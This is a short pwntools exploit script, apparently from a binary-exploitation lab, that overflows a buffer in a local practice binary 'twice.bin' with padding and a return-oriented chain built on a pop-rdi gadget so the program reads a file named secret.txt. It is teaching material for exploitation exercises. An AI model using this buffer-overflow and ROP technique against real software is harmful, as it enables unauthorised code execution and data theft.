#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./twice.bin")

    # You can obtain the information (address) of gadgets for %rdi as follow.
    rop = ROP("./twice.bin")
    print(rop.rdi)

    # You can use this line to pause the script for a while.
    # input("Attach GDB now and press enter... ")

    # The following two lines have the same meaning.
    rdi_gadget = b"\xb3\x12\x40\x00\x00\x00\x00\x00"
    rdi_gadget = p64(0x4012b3) # More concise

    print(p.recvuntil(b"buffer: "))
    p.send(b"./secret.txt")
    print(p.recvuntil(b"buffer: "))
    p.send(b"a" * 0x28 + rdi_gadget + p64(0x404080) + p64(0x401156))
    print(p.recvline())


if __name__ == "__main__":
    exploit()
